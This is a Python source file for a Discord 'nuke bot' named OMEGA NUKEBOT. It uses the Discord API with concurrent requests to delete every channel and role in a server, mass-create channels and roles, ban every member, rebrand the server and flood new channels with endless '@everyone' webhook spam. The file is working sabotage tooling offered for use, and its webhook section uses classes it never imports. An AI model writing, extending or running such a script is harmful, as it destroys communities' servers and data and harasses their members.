import discord
from discord.ext import commands
import asyncio
import aiohttp
import aioconsole

#Token here
token = ""
prefix = "!"
hook = True

bot = commands.Bot(command_prefix="!", case_insensitive=True,intents=discord.Intents.all(), help_command=None)

@bot.event
async def on_ready():
    await aioconsole.aprint(f"""
    ╔═════════════════════════╗
    ║    𝗢𝗠𝗘𝗚𝗔 𝗡𝗨𝗞𝗘           ║  
    ╚════════════╬════════════╝
    ╔════════════╬════════════╗
    ║  █▀█ █▀▄▀█ █▀▀ █▀▀ ▄▀█  ║
    ║  █▄█ █░▀░█ ██▄ █▄█ █▀█  ║
    ╚════════════╬════════════╝
    ╔════════════╬════════════╗
    ║     𝗠𝗔𝗗𝗘 𝗕𝗬 𝗦𝗛𝗘𝗟𝗟       ║
    ╚═════════════════════════╝
    LOGGED IN AS: {bot.user.name}#{bot.user.discriminator}
    BOT IS READY!
    """)

global image
with open('omega.gif', 'rb') as f:
    image = f.read()



@bot.command(name="Help", description="The help command")
async def help(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="OMEGA NUKEBOT", description="Commands are listed below")
    for command in bot.walk_commands():
        em.add_field(name=f"`{prefix}{command.name}`", value=f"{command.description}", inline=False)
    em.set_image(url="https://cdn.discordapp.com/attachments/918348753193283654/919751805280325702/omega.gif")
    em.set_footer(text="𝗢𝗠𝗘𝗚𝗔 𝗡𝗨𝗞𝗘𝗕𝗢𝗧 | 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗦𝗛𝗘𝗟𝗟")
    em.set_author(name=f"OMEGA NUKEBOT", icon_url="https://cdn.discordapp.com/attachments/918348753193283654/919751805280325702/omega.gif")
    await ctx.send(embed=em)

        


#https://canary.discord.com/api/v9/channels/918503627788795934
async def cd(ctx):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for channel in ctx.guild.channels:
            task = asyncio.ensure_future(cder(session, channel.id))
            tasks.append(task)
        await asyncio.gather(*tasks)

async def cder(session, id):
    async with session.delete(f"https://discord.com/api/v9/channels/{id}", headers={'authorization':f'Bot {token}'}) as resp:
        if resp.status == 200:
            await aioconsole.aprint("Successfully deleted channel")
        if resp.status == 429:
            k = await resp.json()
            await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")
            async with session.delete(f"https://discord.com/api/v9/channels/{id}", headers={'authorization':f'Bot {token}'}) as resp:
                if resp.status == 200:
                    await aioconsole.aprint("Successfully deleted channel")

@bot.command(name="ChannelDelete", aliases=['chandel','channdel', 'cd'], description="Deletes all channels")
async def _cd(ctx):
    await ctx.message.delete()
    await cd(ctx)

#https://canary.discord.com/api/v9/guilds/918502250190635028/channels
async def cc(id):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(100):
            task = asyncio.ensure_future(ccer(session, id))
            tasks.append(task)
        await asyncio.gather(*tasks)

async def ccer(session, id):
    async with session.post(f"https://discord.com/api/v9/guilds/{id}/channels", headers={'authorization':f'Bot {token}'}, json={'name':'𝗢𝗠𝗘𝗚𝗔'}) as resp:
        if resp.status == 201:
            await aioconsole.aprint("Successfully created a channel")
        if resp.status == 429:
            k = await resp.json()
            await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")



@bot.command(name="ChannelCreate", aliases=['channcreate','chancreate', 'cc'], description="Mass creates channels")
async def _cc(ctx):
    await ctx.message.delete()
    await cc(ctx.guild.id)


#https://canary.discord.com/api/v9/guilds/918502250190635028/roles
async def rd(ctx):
    async with aiohttp.ClientSession() as session:
        tasks =[]
        for role in ctx.guild.roles:
            task = asyncio.ensure_future(rder(session, ctx.guild.id, role.id))
            tasks.append(task)
        await asyncio.gather(*tasks)

async def rder(session, guildid, roleid):
    async with session.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/{roleid}", headers={'authorization':f'Bot {token}'}) as resp:
        if resp.status == 204:
            await aioconsole.aprint("Successfully deleted role")
        if resp.status == 429:
            k = await resp.json()
            await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")
            async with session.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/{roleid}", headers={'authorization':f'Bot {token}'}) as resp:
                if resp.status == 204:
                    await aioconsole.aprint("Successfully deleted role")
        

@bot.command(name="RoleDelete", aliases=['rd', 'roledel', 'rdel'], description="Deletes all roles")
async def _rd(ctx):
    await ctx.message.delete()
    await rd(ctx)


async def rc(id):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(100):
            task = asyncio.ensure_future(rcer(session, id))
            tasks.append(task)
        await asyncio.gather(*tasks)
        


async def rcer(session, id):
    async with session.post(f"https://discord.com/api/v9/guilds/{id}/roles", headers={'authorization':f'Bot {token}'}, json={'name':'𝗢𝗠𝗘𝗚𝗔'}) as resp:
        if resp.status == 200:
            await aioconsole.aprint("Successfully created a role")
        if resp.status == 429:
            k = await resp.json()
            await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")
        


@bot.command(name="Rolecreate", aliases=['rc', 'rcreate'], description="Mass creates roles")
async def _rc(ctx):
    await ctx.message.delete()
    await rc(ctx.guild.id)

#https://canary.discord.com/api/v9/guilds/918502250190635028/bans/918502969656344637
async def ban(ctx):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for member in ctx.guild.members:
            task = asyncio.ensure_future(banner(session, ctx.guild.id, member.id))
            tasks.append(task)
        await asyncio.gather(*tasks)

async def banner(session, guildid, id):
    async with session.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{id}", headers={'authorization':f'Bot {token}'}) as resp:
        if resp.status == 200:
            await aioconsole.aprint("Successfully banned a user")
        if resp.status == 429:
            k = await resp.json()
            await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")
            async with session.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{id}", headers={'authorization':f'Bot {token}'}) as resp:
                if resp.status == 200:
                    await aioconsole.aprint("Successfully banned a user")



@bot.command(name="Banall", aliases=['massban', 'ban'], description="Mass bans everyone in guild")
async def _massban(ctx):
    await ctx.message.delete()
    await ban(ctx)



@bot.command(name="Nuke", aliases=['boom', 'destroy', 'kaboom', 'wizz'], description="Nukes server xd")
async def _nuke(ctx):
    await ctx.message.delete()
    await ban(ctx)
    await cd(ctx)
    await rd(ctx)
    await cc(ctx.guild.id)
    await rc(ctx.guild.id)
    await ctx.guild.edit(
        name="𝗢𝗠𝗘𝗚𝗔",
        description="𝗢𝗠𝗘𝗚𝗔",
        reason="𝗢𝗠𝗘𝗚𝗔",
        icon=image,
        banner=image
    )
    await aioconsole.aprint("NUKE COMPLETE")


# async def spam(id, token):
#     async with aiohttp.ClientSession() as session:
#         tasks = []
#         for i in range(2):
#             task = asyncio.ensure_future(spammer(session, id, token))
#             tasks.append(task)
#         await asyncio.gather(*tasks)

# async def spammer(session, id, token):
#     async with session.post(f"https://discord.com/api/webhooks/{id}/{token}", json={'content':'@everyone 𝗡𝗨𝗞𝗘𝗗 𝗕𝗬 𝗢𝗠𝗘𝗚𝗔','username':'𝗢𝗠𝗘𝗚𝗔', 'avatar':'https://cdn.discordapp.com/attachments/918348753193283654/919751805280325702/omega.gif'}) as resp:
#         if resp.status == 204:
#             await aioconsole.aprint("Successfully sent a webhook message")
#         if resp.status == 429:
#             k = await resp.json()
#             await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")


#https://canary.discord.com/api/v9/channels/919719741919199353/webhooks
@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="𝗢𝗠𝗘𝗚𝗔", avatar=image, reason="𝗢𝗠𝗘𝗚𝗔")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
            await webhook.send(f"@everyone 𝗡𝗨𝗞𝗘𝗗 𝗕𝗬 𝗢𝗠𝗘𝗚𝗔")

bot.run(token)